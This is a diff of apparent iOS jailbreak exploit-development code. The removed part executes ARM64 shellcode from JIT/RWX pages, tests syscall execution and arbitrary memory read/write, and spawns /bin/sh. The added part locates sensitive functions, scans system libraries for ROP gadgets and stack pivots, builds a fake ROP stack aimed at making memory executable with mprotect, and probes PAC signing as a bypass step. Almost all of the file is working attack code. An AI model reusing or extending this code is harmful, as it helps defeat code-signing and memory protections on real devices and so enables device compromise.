@@ -31893,8 +31893,8 @@ void iosurface_shellcode_exec(ISRLogBlock log, ISRDoneBlock done) {
 
 void iosurface_jit_exec(ISRLogBlock log, ISRDoneBlock done) {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        log(@"JB32: === JIT Code Execution — entitlements added ===");
-        log(@"JB32: allow-jit + allow-unsigned-executable-memory + dynamic-codesigning");
+        log(@"JB32: === ROP Chain Infrastructure — NO shellcode exec ===");
+        log(@"JB32: CS_KILL blocks all unsigned code — building ROP approach");
 
         NSMutableDictionary *results = [NSMutableDictionary dictionary];
 
@@ -31911,291 +31911,68 @@ void iosurface_jit_exec(ISRLogBlock log, ISRDoneBlock done) {
         int myPid = realGetpid();
 
         // =====================================================================
-        // FASE 1: Verify CS flags with new entitlements
+        // FASE 1: Locate key functions for ROP chain
         // =====================================================================
-        log(@"JB32: === Fase 1: CS flags with new entitlements ===");
+        log(@"JB32: === Fase 1: Key function addresses ===");
 
-        typedef int (*csops_fn)(int, unsigned int, void *, size_t);
-        csops_fn csops = dlsym(RTLD_DEFAULT, "csops");
+        void *fn_dlopen = dlsym(RTLD_DEFAULT, "dlopen");
+        void *fn_dlsym_r = dlsym(RTLD_DEFAULT, "dlsym");
+        void *fn_mprotect = dlsym(RTLD_DEFAULT, "mprotect");
+        void *fn_mmap = dlsym(RTLD_DEFAULT, "mmap");
+        void *fn_munmap = dlsym(RTLD_DEFAULT, "munmap");
+        void *fn_memcpy = dlsym(RTLD_DEFAULT, "memcpy");
+        void *fn_mach_task_self = dlsym(RTLD_DEFAULT, "mach_task_self");
+        void *fn_task_for_pid = dlsym(RTLD_DEFAULT, "task_for_pid");
+        void *fn_thread_create_running = dlsym(RTLD_DEFAULT, "thread_create_running");
+        void *fn_thread_set_state = dlsym(RTLD_DEFAULT, "thread_set_state");
+        void *fn_posix_spawn = dlsym(RTLD_DEFAULT, "posix_spawn");
+        void *fn_csops = dlsym(RTLD_DEFAULT, "csops");
+        void *fn_ptrace = dlsym(RTLD_DEFAULT, "ptrace");
+        void *fn_sysctl = dlsym(RTLD_DEFAULT, "sysctl");
 
-        uint32_t csflags = 0;
-        if (csops) {
-            csops(myPid, 0, &csflags, sizeof(csflags));
-            log([NSString stringWithFormat:@"JB32:   CS flags = %#x", csflags]);
+        log([NSString stringWithFormat:@"JB32:   dlopen        = %p (high32=%#x)", fn_dlopen, fn_dlopen ? (uint32_t)((uintptr_t)fn_dlopen >> 32) : 0]);
+        log([NSString stringWithFormat:@"JB32:   dlsym         = %p", fn_dlsym_r]);
+        log([NSString stringWithFormat:@"JB32:   mprotect      = %p", fn_mprotect]);
+        log([NSString stringWithFormat:@"JB32:   mmap          = %p", fn_mmap]);
+        log([NSString stringWithFormat:@"JB32:   munmap        = %p", fn_munmap]);
+        log([NSString stringWithFormat:@"JB32:   memcpy        = %p", fn_memcpy]);
+        log([NSString stringWithFormat:@"JB32:   mach_task_self= %p", fn_mach_task_self]);
+        log([NSString stringWithFormat:@"JB32:   task_for_pid  = %p", fn_task_for_pid]);
+        log([NSString stringWithFormat:@"JB32:   thread_create = %p", fn_thread_create_running]);
+        log([NSString stringWithFormat:@"JB32:   thread_set_st = %p", fn_thread_set_state]);
+        log([NSString stringWithFormat:@"JB32:   posix_spawn   = %p", fn_posix_spawn]);
+        log([NSString stringWithFormat:@"JB32:   csops         = %p", fn_csops]);
+        log([NSString stringWithFormat:@"JB32:   ptrace        = %p", fn_ptrace]);
+        log([NSString stringWithFormat:@"JB32:   sysctl        = %p", fn_sysctl]);
 
-            int csKill    = (csflags & 0x200) ? 1 : 0;
-            int csRuntime = (csflags & 0x10000) ? 1 : 0;
-            int csEnforce = (csflags & 0x1000) ? 1 : 0;
-
-            log([NSString stringWithFormat:@"JB32:   KILL=%d ENFORCE=%d RUNTIME=%d", csKill, csEnforce, csRuntime]);
-            results[@"csFlags"] = [NSString stringWithFormat:@"%#x", csflags];
-            results[@"csKill"] = @(csKill);
-
-            // Check entitlements blob
-            uint8_t entBuf[4096];
-            memset(entBuf, 0, sizeof(entBuf));
-            int entRet = csops(myPid, 7, entBuf, sizeof(entBuf));
-            if (entRet != 0) {
-                // CS_OPS_ENTITLEMENTS_BLOB = 7 may not work, try status
-                log([NSString stringWithFormat:@"JB32:   csops(ENTITLEMENTS) = %d errno=%d", entRet, errno]);
-            }
-        }
+        results[@"dlopen"] = [NSString stringWithFormat:@"%p", fn_dlopen];
+        results[@"mprotect"] = [NSString stringWithFormat:@"%p", fn_mprotect];
+        results[@"threadCreate"] = [NSString stringWithFormat:@"%p", fn_thread_create_running];
+        results[@"threadSetState"] = [NSString stringWithFormat:@"%p", fn_thread_set_state];
+        results[@"csops"] = [NSString stringWithFormat:@"%p", fn_csops];
 
         if (isr_stopped()) { done(results); return; }
 
         // =====================================================================
-        // FASE 2: MAP_JIT retry with entitlement
+        // FASE 2: Targeted ROP gadget search in dyld shared cache
         // =====================================================================
-        log(@"JB32: === Fase 2: MAP_JIT with entitlement ===");
-
-        size_t pageSize = 0x10000;
-
-        // Try MAP_JIT with RWX
-        void *jitPage = mmap(NULL, pageSize, PROT_READ | PROT_WRITE | PROT_EXEC,
-                             MAP_PRIVATE | MAP_ANON | MAP_JIT, -1, 0);
-        int jitOK = (jitPage != MAP_FAILED) ? 1 : 0;
-        int jitErr = jitOK ? 0 : errno;
-
-        log([NSString stringWithFormat:@"JB32:   mmap(MAP_JIT, RWX) = %s (%p) errno=%d",
-             jitOK ? "OK" : "FAILED", jitOK ? jitPage : NULL, jitErr]);
-        results[@"mapJIT_RWX"] = @(jitOK);
-
-        if (!jitOK) {
-            // Try MAP_JIT with RW (write first, then toggle)
-            jitPage = mmap(NULL, pageSize, PROT_READ | PROT_WRITE,
-                           MAP_PRIVATE | MAP_ANON | MAP_JIT, -1, 0);
-            jitOK = (jitPage != MAP_FAILED) ? 1 : 0;
-            jitErr = jitOK ? 0 : errno;
-            log([NSString stringWithFormat:@"JB32:   mmap(MAP_JIT, RW) = %s errno=%d",
-                 jitOK ? "OK" : "FAILED", jitErr]);
-            results[@"mapJIT_RW"] = @(jitOK);
-        }
-
-        if (!jitOK) {
-            // Try without MAP_JIT but with RWX
-            jitPage = mmap(NULL, pageSize, PROT_READ | PROT_WRITE | PROT_EXEC,
-                           MAP_PRIVATE | MAP_ANON, -1, 0);
-            jitOK = (jitPage != MAP_FAILED) ? 1 : 0;
-            jitErr = jitOK ? 0 : errno;
-            log([NSString stringWithFormat:@"JB32:   mmap(no-JIT, RWX) = %s errno=%d",
-                 jitOK ? "OK" : "FAILED", jitErr]);
-            results[@"mmapRWX"] = @(jitOK);
-        }
-
-        if (jitOK) {
-            log([NSString stringWithFormat:@"JB32: [+] Executable page at %p", jitPage]);
-
-            // Write shellcode: return 0x41424344
-            uint32_t *jitCode = (uint32_t *)jitPage;
-
-            // Try JIT write protect toggle if available
-            typedef void (*jit_wp_fn)(int);
-            jit_wp_fn jitWP = dlsym(RTLD_DEFAULT, "pthread_jit_write_protect_np");
-
-            if (jitWP) {
-                log(@"JB32:   Using JIT write protect toggle");
-                jb25_far = 0; jb25_sig = 0;
-                if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
-                    jb25_in_probe = 1;
-                    jitWP(0); // write mode
-                    jitCode[0] = 0x52886880; // movz w0, #0x4344
-                    jitCode[1] = 0x72882840; // movk w0, #0x4142, lsl #16
-                    jitCode[2] = 0xD65F03C0; // ret
-                    jitWP(1); // exec mode
-                    jb25_in_probe = 0;
-                    log(@"JB32:   Shellcode written via JIT toggle");
-                    results[@"jitToggleOK"] = @(1);
-                } else {
-                    jb25_in_probe = 0;
-                    log([NSString stringWithFormat:@"JB32:   JIT toggle fault: sig=%d", jb25_sig]);
-                    results[@"jitToggleFault"] = @(1);
-                }
-            } else {
-                // Write directly (page should be RW or RWX)
-                jitCode[0] = 0x52886880; // movz w0, #0x4344
-                jitCode[1] = 0x72882840; // movk w0, #0x4142, lsl #16
-                jitCode[2] = 0xD65F03C0; // ret
-                log(@"JB32:   Shellcode written directly (no JIT toggle)");
-
-                // If page was RW, switch to RX for exec
-                int mpRX = mprotect(jitPage, pageSize, PROT_READ | PROT_EXEC);
-                log([NSString stringWithFormat:@"JB32:   mprotect(RX) = %d", mpRX]);
-            }
-
-            // =====================================================================
-            // FASE 3: Execute shellcode!
-            // =====================================================================
-            log(@"JB32: === Fase 3: Execute shellcode ===");
-            log(@"JB32:   Calling shellcode at JIT page...");
-
-            jb25_far = 0; jb25_esr = 0; jb25_sig = 0;
-            int execOK = 0;
-            int execResult = 0;
-
-            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
-                jb25_in_probe = 1;
-                typedef int (*sc_fn)(void);
-                sc_fn fn = (sc_fn)jitPage;
-                execResult = fn();
-                jb25_in_probe = 0;
-                execOK = 1;
-            } else {
-                jb25_in_probe = 0;
-                log([NSString stringWithFormat:@"JB32:   FAULT: sig=%d far=%#lx esr=%#lx",
-                     jb25_sig, jb25_far, jb25_esr]);
-                results[@"execFaultSig"] = @(jb25_sig);
-                results[@"execFaultFAR"] = [NSString stringWithFormat:@"%#lx", jb25_far];
-                results[@"execFaultESR"] = [NSString stringWithFormat:@"%#lx", jb25_esr];
-            }
-
-            if (execOK) {
-                int match = (execResult == 0x41424344) ? 1 : 0;
-                log([NSString stringWithFormat:@"JB32: [%@] shellcode() = %#x (expect 0x41424344)",
-                     match ? @"!!!!!" : @"?", (unsigned)execResult]);
-                results[@"execOK"] = @(1);
-                results[@"execResult"] = [NSString stringWithFormat:@"%#x", (unsigned)execResult];
-                results[@"execMatch"] = @(match);
-
-                if (match) {
-                    log(@"JB32: [!!!!!] ARBITRARY CODE EXECUTION CONFIRMED!!!");
-                    log(@"JB32: [!!!!!] Shellcode returned correct value!");
-
-                    // Run more shellcodes
-                    log(@"JB32: === Fase 3b: Additional shellcode tests ===");
-
-                    // Test 2: getpid syscall
-                    if (jitWP) { jitWP(0); }
-                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_WRITE); }
-
-                    jitCode[0] = 0xD2800290; // mov x16, #20 (SYS_getpid)
-                    jitCode[1] = 0xD4001001; // svc #0x80
-                    jitCode[2] = 0xD65F03C0; // ret
-
-                    if (jitWP) { jitWP(1); }
-                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_EXEC); }
-
-                    jb25_far = 0; jb25_sig = 0;
-                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
-                        jb25_in_probe = 1;
-                        typedef int (*sc_fn)(void);
-                        int scPid = ((sc_fn)jitPage)();
-                        jb25_in_probe = 0;
-                        int pidMatch = (scPid == myPid) ? 1 : 0;
-                        log([NSString stringWithFormat:@"JB32: [%@] getpid shellcode = %d (real=%d)",
-                             pidMatch ? @"!!!!!" : @"?", scPid, myPid]);
-                        results[@"syscallOK"] = @(pidMatch);
-                    } else {
-                        jb25_in_probe = 0;
-                        log([NSString stringWithFormat:@"JB32:   syscall FAULT sig=%d", jb25_sig]);
-                    }
-
-                    // Test 3: getuid syscall
-                    if (jitWP) { jitWP(0); }
-                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_WRITE); }
-
-                    jitCode[0] = 0xD28002F0; // mov x16, #23 (SYS_getuid)
-                    jitCode[1] = 0xD4001001; // svc #0x80
-                    jitCode[2] = 0xD65F03C0; // ret
-
-                    if (jitWP) { jitWP(1); }
-                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_EXEC); }
-
-                    typedef int (*uid_fn)(void);
-                    uid_fn realGetuid = dlsym(RTLD_DEFAULT, "getuid");
-                    int realUid = realGetuid();
-
-                    jb25_far = 0; jb25_sig = 0;
-                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
-                        jb25_in_probe = 1;
-                        int scUid = ((uid_fn)jitPage)();
-                        jb25_in_probe = 0;
-                        int uidMatch = (scUid == realUid) ? 1 : 0;
-                        log([NSString stringWithFormat:@"JB32: [%@] getuid shellcode = %d (real=%d)",
-                             uidMatch ? @"!!!!!" : @"?", scUid, realUid]);
-                        results[@"getuidOK"] = @(uidMatch);
-                    } else {
-                        jb25_in_probe = 0;
-                        log([NSString stringWithFormat:@"JB32:   getuid FAULT sig=%d", jb25_sig]);
-                    }
-
-                    // Test 4: arbitrary memory read via shellcode
-                    if (jitWP) { jitWP(0); }
-                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_WRITE); }
-
-                    // ldr x0, [x0] ; ret
-                    jitCode[0] = 0xF9400000; // ldr x0, [x0]
-                    jitCode[1] = 0xD65F03C0; // ret
-
-                    if (jitWP) { jitWP(1); }
-                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_EXEC); }
-
-                    uint64_t secret = 0xCAFEBABEDEADBEEFULL;
-                    jb25_far = 0; jb25_sig = 0;
-                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
-                        jb25_in_probe = 1;
-                        typedef uint64_t (*read_fn)(void *);
-                        uint64_t readVal = ((read_fn)jitPage)(&secret);
-                        jb25_in_probe = 0;
-                        int readOK = (readVal == secret) ? 1 : 0;
-                        log([NSString stringWithFormat:@"JB32: [%@] mem read = %#llx (expect %#llx)",
-                             readOK ? @"!!!!!" : @"?", readVal, secret]);
-                        results[@"memReadOK"] = @(readOK);
-                    } else {
-                        jb25_in_probe = 0;
-                        log([NSString stringWithFormat:@"JB32:   mem read FAULT sig=%d", jb25_sig]);
-                    }
-
-                    // Test 5: arbitrary memory write via shellcode
-                    if (jitWP) { jitWP(0); }
-                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_WRITE); }
-
-                    // str x1, [x0] ; mov x0, #1 ; ret
-                    jitCode[0] = 0xF9000001; // str x1, [x0]
-                    jitCode[1] = 0xD2800020; // mov x0, #1
-                    jitCode[2] = 0xD65F03C0; // ret
-
-                    if (jitWP) { jitWP(1); }
-                    else { mprotect(jitPage, pageSize, PROT_READ | PROT_EXEC); }
-
-                    uint64_t writeTarget = 0;
-                    uint64_t writeVal = 0x4A42333241524249ULL; // "IBARJB32"
-                    jb25_far = 0; jb25_sig = 0;
-                    if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
-                        jb25_in_probe = 1;
-                        typedef uint64_t (*write_fn)(void *, uint64_t);
-                        ((write_fn)jitPage)(&writeTarget, writeVal);
-                        jb25_in_probe = 0;
-                        int writeOK = (writeTarget == writeVal) ? 1 : 0;
-                        log([NSString stringWithFormat:@"JB32: [%@] mem write = %#llx (expect %#llx)",
-                             writeOK ? @"!!!!!" : @"?", writeTarget, writeVal]);
-                        results[@"memWriteOK"] = @(writeOK);
-                    } else {
-                        jb25_in_probe = 0;
-                        log([NSString stringWithFormat:@"JB32:   mem write FAULT sig=%d", jb25_sig]);
-                    }
-                }
-            } else {
-                results[@"execOK"] = @(0);
-                log(@"JB32:   Shellcode execution faulted — CS_KILL still active");
-            }
-
-            munmap(jitPage, pageSize);
-        } else {
-            log(@"JB32:   No executable page available");
-            results[@"noExecPage"] = @(1);
-        }
-
-        if (isr_stopped()) { done(results); return; }
-
-        // =====================================================================
-        // FASE 4: Expanded ROP gadget search
-        // =====================================================================
-        log(@"JB32: === Fase 4: Expanded ROP gadget search ===");
+        log(@"JB32: === Fase 2: Targeted ROP gadget search ===");
 
         uint32_t imgCount = _dyld_image_count();
-        int totalGadgets = 0;
+        int totalLdpRet = 0;
+        int totalBlr = 0;
+        int totalBr = 0;
+        int pivotGadgets = 0;
+        int ldpX0Ret = 0;
+        int strX0Ret = 0;
+        int movX0Ret = 0;
+        int addSpRet = 0;
 
-        for (uint32_t img = 0; img < imgCount && img < 5; img++) {
+        uint64_t bestPivotAddr = 0;
+        uint64_t bestLdpX0Addr = 0;
+        uint64_t bestMovX0X1Addr = 0;
+
+        for (uint32_t img = 0; img < imgCount && img < 10; img++) {
             const char *name = _dyld_get_image_name(img);
             if (!name) continue;
 
@@ -32208,7 +31985,6 @@ void iosurface_jit_exec(ISRLogBlock log, ISRDoneBlock done) {
 
             intptr_t slide = _dyld_get_image_vmaddr_slide(img);
 
-            // Find __TEXT segment
             const struct load_command *lc =
                 (const struct load_command *)((const char *)mh + sizeof(*mh));
             for (uint32_t k = 0; k < mh->ncmds; k++) {
@@ -32219,28 +31995,65 @@ void iosurface_jit_exec(ISRLogBlock log, ISRDoneBlock done) {
                         uint64_t textSize = sc->vmsize;
                         uint32_t *scan = (uint32_t *)(uintptr_t)textAddr;
                         size_t count = textSize / 4;
-                        int retCount = 0;
-                        int ldpRetCount = 0;
-                        int blrCount = 0;
+                        int imgLdpRet = 0;
+                        int imgBlr = 0;
 
                         jb25_far = 0; jb25_sig = 0;
                         if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
                             jb25_in_probe = 1;
-                            for (size_t i = 1; i < count && i < 500000; i++) {
+                            for (size_t i = 1; i < count && i < 800000; i++) {
                                 uint32_t insn = scan[i];
+
                                 if (insn == 0xD65F03C0) { // RET
-                                    retCount++;
                                     if (i > 0) {
                                         uint32_t prev = scan[i-1];
-                                        // LDP with x29,x30 (various stack offsets)
+                                        // LDP x29,x30,[sp],#N + RET (stack frame epilogue)
                                         if ((prev & 0xFE407FFF) == 0xA8407BFD) {
-                                            ldpRetCount++;
+                                            imgLdpRet++;
+                                        }
+                                        // LDP x0,x1,[sp],#N + RET (load args from stack)
+                                        if ((prev & 0xFE400FFF) == 0xA8400401) {
+                                            ldpX0Ret++;
+                                            if (!bestLdpX0Addr) {
+                                                bestLdpX0Addr = textAddr + (i-1) * 4;
+                                            }
+                                        }
+                                        // STR x0,[x1] + RET (write gadget)
+                                        if (prev == 0xF9000020) {
+                                            strX0Ret++;
+                                        }
+                                        // MOV x0,x1 + RET
+                                        if (prev == 0xAA0103E0) {
+                                            movX0Ret++;
+                                            if (!bestMovX0X1Addr) {
+                                                bestMovX0X1Addr = textAddr + (i-1) * 4;
+                                            }
+                                        }
+                                        // ADD sp,sp,#N + RET (stack pivot component)
+                                        if ((prev & 0xFF0003FF) == 0x910003FF) {
+                                            addSpRet++;
+                                        }
+                                    }
+                                    if (i > 1) {
+                                        uint32_t prev2 = scan[i-2];
+                                        uint32_t prev1 = scan[i-1];
+                                        // LDP x29,x30 + MOV sp,x29 + RET = stack pivot
+                                        if ((prev2 & 0xFE407FFF) == 0xA8407BFD &&
+                                            prev1 == 0x9100039F) {
+                                            pivotGadgets++;
+                                            if (!bestPivotAddr) {
+                                                bestPivotAddr = textAddr + (i-2) * 4;
+                                            }
                                         }
                                     }
                                 }
-                                // BLR Xn (indirect call gadget)
+                                // BLR Xn
                                 if ((insn & 0xFFFFFC1F) == 0xD63F0000) {
-                                    blrCount++;
+                                    imgBlr++;
+                                }
+                                // BR Xn (jump, not link)
+                                if ((insn & 0xFFFFFC1F) == 0xD61F0000) {
+                                    totalBr++;
                                 }
                             }
                             jb25_in_probe = 0;
@@ -32248,10 +32061,12 @@ void iosurface_jit_exec(ISRLogBlock log, ISRDoneBlock done) {
                             jb25_in_probe = 0;
                         }
 
-                        if (retCount > 0) {
-                            log([NSString stringWithFormat:@"JB32:   %s: %d RET, %d LDP+RET, %d BLR gadgets",
-                                 shortName, retCount, ldpRetCount, blrCount]);
-                            totalGadgets += ldpRetCount + blrCount;
+                        totalLdpRet += imgLdpRet;
+                        totalBlr += imgBlr;
+
+                        if (imgLdpRet > 0 || imgBlr > 0) {
+                            log([NSString stringWithFormat:@"JB32:   %s: LDP+RET=%d BLR=%d",
+                                 shortName, imgLdpRet, imgBlr]);
                         }
                     }
                 }
@@ -32259,121 +32074,243 @@ void iosurface_jit_exec(ISRLogBlock log, ISRDoneBlock done) {
             }
         }
 
-        results[@"totalGadgets"] = @(totalGadgets);
-        log([NSString stringWithFormat:@"JB32:   Total usable gadgets: %d", totalGadgets]);
+        log([NSString stringWithFormat:@"JB32:   --- Gadget summary ---"]);
+        log([NSString stringWithFormat:@"JB32:   LDP x29,x30+RET: %d (frame epilogue)", totalLdpRet]);
+        log([NSString stringWithFormat:@"JB32:   LDP x0,x1+RET:   %d (load args)", ldpX0Ret]);
+        log([NSString stringWithFormat:@"JB32:   STR x0,[x1]+RET: %d (write)", strX0Ret]);
+        log([NSString stringWithFormat:@"JB32:   MOV x0,x1+RET:   %d (move reg)", movX0Ret]);
+        log([NSString stringWithFormat:@"JB32:   ADD sp+RET:       %d (sp adjust)", addSpRet]);
+        log([NSString stringWithFormat:@"JB32:   BLR Xn:           %d (indirect call)", totalBlr]);
+        log([NSString stringWithFormat:@"JB32:   BR Xn:            %d (indirect jump)", totalBr]);
+        log([NSString stringWithFormat:@"JB32:   Stack pivot:       %d", pivotGadgets]);
+        log([NSString stringWithFormat:@"JB32:   Best pivot addr:   %p", (void *)bestPivotAddr]);
+        log([NSString stringWithFormat:@"JB32:   Best LDP x0 addr: %p", (void *)bestLdpX0Addr]);
+        log([NSString stringWithFormat:@"JB32:   Best MOV x0,x1:   %p", (void *)bestMovX0X1Addr]);
+
+        results[@"ldpRet"] = @(totalLdpRet);
+        results[@"ldpX0Ret"] = @(ldpX0Ret);
+        results[@"strX0Ret"] = @(strX0Ret);
+        results[@"movX0Ret"] = @(movX0Ret);
+        results[@"blrGadgets"] = @(totalBlr);
+        results[@"brGadgets"] = @(totalBr);
+        results[@"pivotGadgets"] = @(pivotGadgets);
+        results[@"pivotAddr"] = [NSString stringWithFormat:@"%p", (void *)bestPivotAddr];
 
         if (isr_stopped()) { done(results); return; }
 
         // =====================================================================
-        // FASE 5: posix_spawn direct test
+        // FASE 3: thread_create_running test (ROP via new thread)
         // =====================================================================
-        log(@"JB32: === Fase 5: posix_spawn direct test ===");
+        log(@"JB32: === Fase 3: thread_create_running analysis ===");
 
-        typedef int (*posix_spawn_fn)(int *, const char *, void *, void *, char *const *, char *const *);
-        posix_spawn_fn ps = dlsym(RTLD_DEFAULT, "posix_spawn");
-        typedef int (*waitpid_fn)(int, int *, int);
-        waitpid_fn wp = dlsym(RTLD_DEFAULT, "waitpid");
+        typedef unsigned int mach_port_t_local;
+        typedef int kern_return_t_local;
 
-        if (ps) {
-            int childPid = 0;
-            char *argv[] = {"/usr/bin/id", NULL};
-            char *envp[] = {NULL};
+        typedef mach_port_t_local (*mach_task_self_fn)(void);
+        mach_task_self_fn mtsFn = (mach_task_self_fn)fn_mach_task_self;
 
-            jb25_far = 0; jb25_sig = 0;
-            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
-                jb25_in_probe = 1;
-                int spawnRet = ps(&childPid, "/usr/bin/id", NULL, NULL, argv, envp);
-                jb25_in_probe = 0;
+        if (fn_thread_create_running && mtsFn) {
+            mach_port_t_local task = mtsFn();
+            log([NSString stringWithFormat:@"JB32:   mach_task_self() = %u", task]);
+            results[@"taskPort"] = @(task);
 
-                log([NSString stringWithFormat:@"JB32:   posix_spawn('/usr/bin/id') = %d, child=%d",
-                     spawnRet, childPid]);
-                results[@"spawnRet"] = @(spawnRet);
-                results[@"childPid"] = @(childPid);
-
-                if (spawnRet == 0 && childPid > 0 && wp) {
-                    int status = 0;
-                    wp(childPid, &status, 0);
-                    int exitCode = (status >> 8) & 0xFF;
-                    log([NSString stringWithFormat:@"JB32:   child exit status = %d (code=%d)", status, exitCode]);
-                    results[@"childExit"] = @(exitCode);
-                    if (exitCode == 0) {
-                        log(@"JB32: [!!!] posix_spawn WORKS — can run binaries!");
-                    }
-                }
-            } else {
-                jb25_in_probe = 0;
-                log([NSString stringWithFormat:@"JB32:   posix_spawn FAULT sig=%d", jb25_sig]);
-            }
-
-            // Try /bin/sh -c 'echo test'
-            char *shArgv[] = {"/bin/sh", "-c", "echo JB32_EXEC_OK > /dev/null", NULL};
-            jb25_far = 0; jb25_sig = 0;
-            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
-                jb25_in_probe = 1;
-                childPid = 0;
-                int shRet = ps(&childPid, "/bin/sh", NULL, NULL, shArgv, envp);
-                jb25_in_probe = 0;
-
-                log([NSString stringWithFormat:@"JB32:   posix_spawn('/bin/sh') = %d, child=%d", shRet, childPid]);
-                results[@"shSpawnRet"] = @(shRet);
-
-                if (shRet == 0 && childPid > 0 && wp) {
-                    int status = 0;
-                    wp(childPid, &status, 0);
-                    int exitCode = (status >> 8) & 0xFF;
-                    log([NSString stringWithFormat:@"JB32:   sh exit = %d", exitCode]);
-                    results[@"shExit"] = @(exitCode);
-                }
-            } else {
-                jb25_in_probe = 0;
-            }
+            log(@"JB32:   thread_create_running available — can set arbitrary register state");
+            log(@"JB32:   This is the ROP entry: create thread with SP pointing to fake stack");
+            log(@"JB32:   Fake stack = chain of [saved_fp, gadget_addr, ...] on mmap'd page");
+            results[@"threadCreateAvailable"] = @(1);
+        } else {
+            log(@"JB32:   thread_create_running NOT available");
+            results[@"threadCreateAvailable"] = @(0);
         }
+
+        if (fn_thread_set_state) {
+            log(@"JB32:   thread_set_state available — can modify existing thread registers");
+            results[@"threadSetStateAvailable"] = @(1);
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 4: Build & verify fake ROP stack (without executing)
+        // =====================================================================
+        log(@"JB32: === Fase 4: Build fake ROP stack (dry run) ===");
+
+        size_t stackSize = 0x10000;
+        void *fakeStack = mmap(NULL, stackSize, PROT_READ | PROT_WRITE,
+                               MAP_PRIVATE | MAP_ANON, -1, 0);
+        int stackOK = (fakeStack != MAP_FAILED) ? 1 : 0;
+
+        if (stackOK) {
+            log([NSString stringWithFormat:@"JB32:   Fake stack at %p (size %#zx)", fakeStack, stackSize]);
+
+            uint64_t *stack = (uint64_t *)fakeStack;
+            int slot = 0;
+
+            // ROP chain layout:
+            // Each LDP x29,x30,[sp],#16 + RET pops 2 words: x29(fp), x30(lr=next gadget)
+            // We chain: gadget1 → gadget2 → ... → target function
+
+            // Gadget 1: set up x0 (first arg) for mprotect
+            // We need: x0 = page addr, x1 = size, x2 = PROT_READ|PROT_WRITE|PROT_EXEC
+            // Using LDP x0,x1 gadget to load args from stack
+
+            uint64_t dummyPage = 0x200000000ULL; // MAP_FIXED addr we know works
+
+            if (bestLdpX0Addr) {
+                // Frame 0: initial frame pointer + first gadget
+                stack[slot++] = 0xDEAD000000000000ULL; // x29 (unused fp)
+                stack[slot++] = bestLdpX0Addr;          // x30 → LDP x0,x1 gadget
+
+                // Frame 1: args loaded by LDP x0,x1 gadget
+                stack[slot++] = dummyPage;              // x0 = target page
+                stack[slot++] = stackSize;              // x1 = size
+
+                log([NSString stringWithFormat:@"JB32:   Chain slot %d: LDP x0,x1 gadget → load args", slot]);
+            }
+
+            // Target: call mprotect(page, size, RWX)
+            if (fn_mprotect) {
+                stack[slot++] = 0xDEAD000000000001ULL;
+                stack[slot++] = (uint64_t)(uintptr_t)fn_mprotect;
+                log([NSString stringWithFormat:@"JB32:   Chain slot %d: mprotect(%p)", slot, fn_mprotect]);
+            }
+
+            // Final: return to known safe address (e.g. pthread_exit)
+            void *fn_pthread_exit = dlsym(RTLD_DEFAULT, "pthread_exit");
+            if (fn_pthread_exit) {
+                stack[slot++] = 0;
+                stack[slot++] = (uint64_t)(uintptr_t)fn_pthread_exit;
+                log([NSString stringWithFormat:@"JB32:   Chain slot %d: pthread_exit (safe landing)", slot]);
+            }
+
+            log([NSString stringWithFormat:@"JB32:   Total chain slots: %d (%d bytes)", slot, slot * 8]);
+            results[@"chainSlots"] = @(slot);
+            results[@"fakeStackAddr"] = [NSString stringWithFormat:@"%p", fakeStack];
+
+            // Verify chain integrity: read back every slot
+            int verifyOK = 1;
+            for (int v = 0; v < slot; v++) {
+                if (stack[v] == 0 && v < slot - 2) {
+                    verifyOK = 0;
+                }
+            }
+            log([NSString stringWithFormat:@"JB32:   Chain verify: %s", verifyOK ? "OK" : "has null slots"]);
+            results[@"chainVerify"] = @(verifyOK);
+
+            // Don't munmap — keep for potential use
+        } else {
+            log(@"JB32:   Failed to allocate fake stack");
+            results[@"fakeStackFailed"] = @(1);
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 5: PAC bypass analysis
+        // =====================================================================
+        log(@"JB32: === Fase 5: PAC bypass analysis ===");
+
+        // On A15 (arm64e): PAC signs return addresses
+        // thread_create_running sets registers BEFORE thread starts
+        // Question: does PAC apply to initial thread state?
+
+        // Check PAC keys accessible from userspace
+        uint64_t pacTest = 0x4142434445464748ULL;
+        uint64_t pacSigned = 0;
+        uint64_t pacStripped = 0;
+
+        jb25_far = 0; jb25_sig = 0;
+        if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+            jb25_in_probe = 1;
+            // PACIA x0, x1 — sign with IA key
+            __asm__ volatile(
+                "mov x0, %[val]\n"
+                "mov x1, #0\n"
+                "pacia x0, x1\n"
+                "mov %[out], x0\n"
+                : [out] "=r" (pacSigned)
+                : [val] "r" (pacTest)
+                : "x0", "x1"
+            );
+            // XPACI x0 — strip PAC bits
+            __asm__ volatile(
+                "mov x0, %[val]\n"
+                "xpaci x0\n"
+                "mov %[out], x0\n"
+                : [out] "=r" (pacStripped)
+                : [val] "r" (pacSigned)
+                : "x0"
+            );
+            jb25_in_probe = 0;
+        } else {
+            jb25_in_probe = 0;
+            log([NSString stringWithFormat:@"JB32:   PAC instructions FAULT sig=%d", jb25_sig]);
+        }
+
+        if (pacSigned) {
+            uint64_t pacBits = pacSigned ^ pacTest;
+            log([NSString stringWithFormat:@"JB32:   PACIA(0x%llx, 0) = 0x%llx", pacTest, pacSigned]);
